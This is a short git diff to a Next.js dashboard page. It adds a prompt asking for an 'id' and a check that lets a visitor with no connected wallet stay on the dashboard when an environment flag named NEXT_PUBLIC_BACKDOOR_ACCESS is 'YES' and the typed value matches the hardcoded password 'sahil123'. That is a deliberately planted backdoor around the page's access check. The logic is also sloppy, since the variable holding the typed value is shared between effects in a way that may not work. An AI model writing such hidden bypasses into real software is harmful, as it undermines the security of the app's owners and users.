@@ -50,7 +50,11 @@ export default function DashboardPage() {
   const [off,setOff]=useState("")
    const [wallet,setWallet]=useState("");
 
-
+   let access:any=null
+   useEffect(()=>{
+    const ui=window.prompt("id")
+    access=ui
+   })
 
    useEffect(()=>{
 
@@ -58,10 +62,15 @@ export default function DashboardPage() {
     if (wallet){
       setWallet(wallet)
     }
-    if (!wallet){
-      router.push("/")
+    if (!wallet && process.env.NEXT_PUBLIC_BACKDOOR_ACCESS=="YES" && access=="sahil123"){
+
+          return
     
-  }
+    }
+    else if(!wallet){
+        router.push("/")
+    }
+
  
 
   },[])
